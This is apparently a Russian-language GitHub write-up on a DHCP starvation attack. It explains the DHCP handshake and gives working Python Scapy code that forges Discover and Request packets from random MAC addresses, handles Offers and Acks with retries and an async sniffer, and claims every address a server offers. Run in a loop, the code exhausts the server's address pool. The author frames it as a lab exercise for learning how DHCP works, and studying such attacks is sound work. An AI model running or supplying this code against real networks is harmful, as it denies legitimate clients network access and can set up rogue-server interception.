# DHCP-starvation-attack
**DHCP** — Dynamic Host Configuration Protocol, протокол для назначения ip адресов клиентам.
**DHCP Starvation** — Атака на DHCP сервер, путем бесконечного запроса адресов на случайные MAC адреса, истощая пулл сервера.
**DHCP Rogue Server** — Запуск своего DHCP сервера на атакующей машине в сети, заменяя собой основной шлюз.

Сразу дополню, моя реализация атаки выполнялась в стерильных условиях, когда атакующая машина включается первой в сеть и успевает выпулить все адреса до включения первой жертвы, так-же отсутствует реализация обновления аренды адреса и нескольких моментов, но цели сделать полноценную "боевую" атаку и не было. В общем это мой костыльный метод, который не претендует на что-либо, кроме как практическим разбором подноготной DHCP


Итак, первое что нужно понимать, у DHCP 4 стадии - DORA
D - Discover (Клиент ищет DHCP сервер в сети)
O - Offer (Сервер отвечает и предлагает свободный адрес)
R - Request(Клиент принимает адрес)
A - Acknowledge/Ack(Сервер подтверждает и резервирует адрес)

Каждый пакет DHCP содержит 4 уровня
```
Ether / IP / UDP / BOOTP + DHCP options
```
Ether - Канальный уровень, тут лежит dst и src mac
IP - Межсетевой уровень, аналогично dst и src ip 
UDP - Транспортный уровень, тут лежат dport и sport 
BOOTP/DHCP - Прикладной уровень. По сути DHCP является надстройкой над BOOTP и добавляет  массив `options`, с дополнительной информаций и типом текущего фрейма `Discover/Offer/Request/Acknowledge.

Чтобы реализовать DHCP Starvation нужно
1. Отправить пакет `Discover` в сеть
2. Отследить получение `Offer`
3. Отправить `Request`
4. Дождаться `Ack` пакета и сохранить полученный IP адрес в свой пул

Для этого дела я решил выбрать библиотеку Scapy, т.к я в свое время много работал с пайтоном и мне привычнее в нем работать, а Scapy как раз дает возможность слушать и отправлять пакеты на уровне L2(Канальный)


```python
new_mac = str(RandMAC())  
new_xid = random.randint(1, 0xFFFFFFFF)  
ether = Ether(src=new_mac, dst="ff:ff:ff:ff:ff:ff")  
ip = IP(src="0.0.0.0", dst="255.255.255.255")  
udp = UDP(sport=68, dport=67)  
bootp = BOOTP(op=1, xid=new_xid, chaddr=new_mac)  
dhcp = DHCP(options=[("message-type", 1), ('hostname', b'just-pc'), ('param_req_list', [1,3,6]), 'end'])  
  
pkt = ether / ip / udp / bootp / dhcp  
```

Сначала генерируем случайный мак адрес для подмены. 
Вторая строка уже чуть интереснее, дело в том, что на этапе всего взаимодействия DORA клиенту и роутеру нужно как-то различать пакеты, которые идут именно к ним, а какие нет, т.к часто фреймы идут Broadcast(То есть глобально и ко всем). И XID это уникальный идентификатор "сессии", который генерирует клиент в первом фрейме.
Дальше формируем Ether, IP, UDP пакеты, они всегда одинаковые.
И наконец BOOTP, `op=1` это опкод, `1—Пакет от клиента`, `2—Пакет от сервера`, `chaddr — mac адрес клиента`. Остальные параметры выставляются по умолчанию и интереса не представляют.
DHCP -  `message-type` это как раз таки идентификатор типа фрейма, 1-Discover, 2-Offer, 3-Request, 4-Decline , 5-Ack, 6-Nak,7-Release.
`param_req_list` это своего рода список требований для роутера, что нужно клиенту передать помимо адреса. Этот список меняется в зависимости от OS, типа устройства и еще десятков параметров, но почти всегда идут `1-Маска подсети`, `3-Айпи шлюзов`, `6-DNS сервер`

В конце все это склеиваем в единый фрейм и можно отправлять через `sendp` и ловить ответ от сервера.
```python
sendp(pkt, iface='eth0', verbose=VERBOSE_LEVEL)
sniff(iface="eth0", filter="udp dst port 68",  prn=handle_pkt)
```

`filter="udp dst port 68"` - *Это значит в функцию handle_pkt будут передаваться только пакеты у которых на транспортном уровне порт назначения равен 68*

Но тут появляется первая проблема, даже в лабораторных условиях роутер не всегда отвечает на первый DHCP запрос оффером, и программа зависает в бесконечно ожидании. Если обратиться к `RFC 2131`, то он рекомендует отправлять вторую попытку через 4 секунды±1 секунда и после удваивать время(4, 8, 16, 32, 64...)
Я выбрал приближенную к этой рекомендации метод, просто отправлять последующие запросы с 4*`количество попыток`  секунд задержкой. И тут всплывает следующая проблема технического характера, как определить ответил ли сервер и вычленить их него данные для следующего пакета. 
```python
@dataclass  
class PacketState:  
    xid: int  
    mac: Any  
    last_packet: Any  
    next_packet: Any = None  
    get_answer_from_server: bool = False
```
Я решил использовать датаклассы, т.к они хорошо вписываются в архитектуру 

```python
pkt_state = PacketState(new_xid, new_mac, pkt) 
retries = 1 
while not pkt_state.get_answer_from_server:  
    sendp(pkt, iface='eth0', verbose=VERBOSE_LEVEL)  # Send D  
    sniff(iface="eth0", filter="udp dst port 68", timeout=4*retiries, prn=lambda new_pkt: offer_hand(new_pkt, pkt_state)) # Sniff O  
    retiries += 1
```
По итогу этот кусок кода будет отправлять `Discover` запросы, пока не получит offer от сервера.
```python
def offer_hand(pkt, packet_state: PacketState):  
    if pkt[BOOTP].xid == packet_state.xid and pkt[DHCP].options[0][1]==2:  
        offered_ip = pkt[BOOTP].yiaddr  
        server_id = None  
  
        for opt in pkt[DHCP].options:  
            if opt[0] == "server_id":  
                server_id = opt[1]  
                break  
        request_dhcp = DHCP(options=[  
            ("message-type", 3),  # request  
            ("server_id", server_id),  
            ("requested_addr", offered_ip),  
            ("hostname", b'just-pc'),  
            ("param_req_list", [1, 3, 6]),  
            "end"  
        ])  
        bootp = BOOTP(op=1, xid=packet_state.xid, chaddr=packet_state.mac)  
        packet_state.next_packet = (Ether(src=packet_state.mac, dst="ff:ff:ff:ff:ff:ff") /  
                                    IP(src="0.0.0.0", dst="255.255.255.255") /  
                                    UDP(sport=68, dport=67) /  
                                    bootp /  
                                    request_dhcp)  
        packet_state.get_answer_from_server = True
```
Дальше, первым делом в функции обработчике нужно проверить наш ли это вообще пакет, сравниваем по xid. Потом формируем почти такой-же пакет, как и первый, единственное отличие это `message-type` и добавляем `server_id` и предложенный адрес, фрейм дойдет и обработается и без них в большинстве случаев, но так надежнее. 

Казалось бы, отправляем дальше и отлавливаем ACK ответ от сервера. Но тут возникает проблема `race condition`, ACK ответ от сервера прилетает быстрее, чем успевает инициализироваться `sniff()`. Эту проблему можно решить так-же многими способами, но я выбрал наиболее простой путь, а именно сделать асинхронный сниффер, благо scapy имеет встроенный
```python
sniffer = AsyncSniffer(  
    iface="eth0",  
    filter=f"udp dst port 68",  
    prn=lambda new_pkt: ack_hand(new_pkt, pkt_state),  
    store=False  
)  
sniffer.start()  
time.sleep(0.3)  
sendp(pkt_state.next_packet, iface='eth0', verbose=VERBOSE_LEVEL)  
time.sleep(2)    
  
sniffer.stop()
```
Тут все аналогично, за исключением ручного таймаута в 2 секунды. 

```python
def ack_hand(pkt, packet_state):  
    if pkt[BOOTP].xid == packet_state.xid and pkt[DHCP].options[0][1] == 5:  
        Pool.addresses[packet_state.mac] = pkt[BOOTP].yiaddr  
        print(f"New pool stealed addresses {Pool.addresses}")
```
Обработчик `ACK` в описании не нуждается, просто берем предложенный адрес и сохраняем его в любой удобный.

И это всё, запустив этот код N раз можно полностью истощить IP пул адресов у DHCP сервера(просто завернув все в цикл for), если на нем нет защиты от подобного.
